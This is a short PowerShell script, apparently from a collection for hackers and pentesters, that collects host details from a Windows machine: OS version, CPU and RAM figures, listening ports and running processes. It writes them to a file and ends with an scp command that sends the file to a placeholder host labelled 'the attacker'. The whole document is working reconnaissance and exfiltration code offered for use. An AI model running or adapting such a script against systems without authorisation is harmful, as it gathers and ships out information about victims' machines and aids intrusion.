# Send files to linux PC using scp .
# For more scripts https://github.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters

$computerName = $env:COMPUTERNAME

$osVersion = (Get-CimInstance Win32_OperatingSystem).Version
$processorCount = (Get-WmiObject Win32_ComputerSystem).NumberOfProcessors
$ramSize = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB

$openPorts = Get-NetTCPConnection -State Listen | Select-Object -ExpandProperty LocalPort

$runningProcesses = Get-Process

$systemInfo = @"
Computer name: $computerName
OS version: $osVersion
Processor count: $processorCount
RAM size (GB): $ramSize

Open ports:
$($openPorts -join ', ')

Running processes:
$($runningProcesses | Select-Object ProcessName | Out-String)
"@

$systemInfo | Out-File -FilePath "info.txt" -Encoding utf8

# scp to copy the file to the attacker
scp -P <port> "info.txt" <username>@<linux_ip>:~/system_info.txt
